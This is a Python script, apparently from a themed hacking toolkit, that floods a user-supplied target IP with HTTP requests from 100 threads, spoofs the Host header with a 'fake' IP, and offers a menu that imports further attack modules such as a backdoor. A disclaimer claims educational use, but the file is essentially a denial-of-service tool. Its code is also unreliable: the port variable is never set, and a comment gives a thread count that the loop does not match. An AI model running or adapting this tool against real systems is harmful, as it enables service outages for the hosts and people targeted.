import socket
import sys
import threading
import pyfiglet
import colorama
from colorama import Fore

colorama.init()

ascii_banner = pyfiglet.figlet_format("Han-Tyumi")
print(Fore.CYAN + ascii_banner)

print("Hello, My name is Han-Tyumi. I am a cyborg. Born, if you may call it that, into a world that is dense and black.")

while True:
    print("-" * 50)
    print("[*] Disclaimer: This script is to be used only for educational purposes. Do not run script against unauthorized IP's without prior consent.")
    print("[*] This script is configured only to attack port 80.")
    print("[*] If this program is used by bad actors, we aren't to be held accountable for the repercussions")
    print("-" * 50)
    target = input("Enter target IP:")
    fake_ip = input("Enter host IP:")

    # Attack is defined with sockets module
    # Send HTTP GET requests to target IP
    # HOST can be any IP address. Can use fake IP to mask attack
    # Function for the attack
    def single_attack():
        while True:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
            s.sendto(("POST /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
            s.sendto(("HOST: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
            s.close()

    # Run 500 threads of the defined attack
    for i in range(100):
        thread = threading.Thread(target=single_attack)
        thread.start()

    attack_num = 0

    # Function to count attacks
    def count_attacks():
        global attack_num
        while True:
            attack_num += 1
            print(attack_num)

    # Start a separate thread for counting attacks
    count_thread = threading.Thread(target=count_attacks)
    count_thread.start()

    print("What's next comrade?")

    print("[1]. Back to base!")
    print("[2]. MORE POWER!")
    print("[3]. Cyboogie!")
    print("[4]. We need R&D!")
    print("[5]. Survey their ports!")
    print("[6]. Exit")

    # Imports scripts for each attack based on the number chosen, back home, or exit
    selection = input("Choose wisely: ")

    if selection == "1":
        import Harpocratic_Blackbird
    elif selection == "2":
        # Continue to the next iteration of the loop
        continue
    elif selection == "3":
        import Cyboogie
    elif selection == "4":
        import nslookup
    elif selection == "5":
        import BackDoorothy
    elif selection == "6":
        sys.exit()
    else:
        print("Invalid Selection. Enter 1-6.")
